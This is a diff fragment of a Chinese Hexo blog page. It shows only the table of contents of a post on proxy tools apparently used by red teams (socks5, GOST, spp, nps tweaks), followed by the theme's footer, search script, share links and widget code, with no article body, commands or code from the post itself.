+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socks5"><span class="toc-text">socks5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GOST"><span class="toc-text">GOST</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-text">反向代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spp"><span class="toc-text">spp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86%E5%92%8Csocks5%E8%AE%A4%E8%AF%81"><span class="toc-text">开启流量加密和socks5认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%81%E8%A3%85%E6%88%90%E5%85%B6%E4%BB%96%E5%8D%8F%E8%AE%AE"><span class="toc-text">封装成其他协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#udp"><span class="toc-text">udp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#icmp"><span class="toc-text">icmp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#http"><span class="toc-text">http</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nps"><span class="toc-text">nps</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F1"><span class="toc-text">修改信息泄漏1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F2"><span class="toc-text">修改信息泄漏2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E5%8A%A8%E5%B8%B8%E9%87%8F%E7%A1%AC%E7%BC%96%E7%A0%81"><span class="toc-text">改动常量硬编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E6%8E%89%E4%B8%8D%E7%94%A8%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="toc-text">注释掉不用的功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%94%AF%E6%8C%81system%E7%94%A8%E6%88%B7"><span class="toc-text">修改支持system用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-text">流量特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%812"><span class="toc-text">流量特征2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#socks5%E6%B5%81%E7%A8%8B"><span class="toc-text">socks5流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%B9%E5%8A%A8"><span class="toc-text">改动</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-text">免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%85%E7%90%86go%E7%BC%96%E8%AF%91%E4%BF%A1%E6%81%AF"><span class="toc-text">清理go编译信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-text">最后</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F08%2F26%2F%25E5%2588%2586%25E4%25BA%25AB%25E5%2587%25A0%25E4%25B8%25AA%25E6%2594%25BB%25E5%2587%25BB%25E9%2598%259F%25E7%2594%25A8%25E7%259A%2584%25E4%25BB%25A3%25E7%2590%2586%25E6%2596%25B9%25E6%25A1%2588%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
